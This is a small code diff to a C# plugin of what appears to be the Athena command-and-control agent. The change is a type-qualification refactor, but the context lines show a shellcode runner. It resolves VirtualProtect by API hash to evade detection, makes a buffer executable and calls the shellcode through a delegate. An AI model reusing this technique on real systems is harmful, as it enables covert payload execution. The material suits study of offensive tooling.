@@ -8,7 +8,6 @@ using Athena.Utilities;
 using Athena.Models;
 using Athena.Commands;
 using Athena.Models.Responses;
-using static Athena.Commands.DynamicHandler;
 
 namespace Plugins
 {
@@ -82,7 +81,7 @@ namespace Plugins
                             IntPtr pAddr = (IntPtr)ptr;
                             uint lpfOldProtect = 0;
                             IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", DynamicHandler.VirtPro); //Get Pointer for VirtualProtect function
-                            DynamicVirtPro ptrVPD = (DynamicHandler.DynamicVirtPro)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(DynamicHandler.DynamicVirtPro)); //Create VirtualProtect Delegate
+                            DynamicHandler.DynamicVirtPro ptrVPD = (DynamicHandler.DynamicVirtPro)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(DynamicHandler.DynamicVirtPro)); //Create VirtualProtect Delegate
                             ptrVPD(pAddr, (UIntPtr)buffer.Length, 0x00000020, out lpfOldProtect); //Call Virtual Protect
 
                             BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate)); //Create delegate for our sc buffer
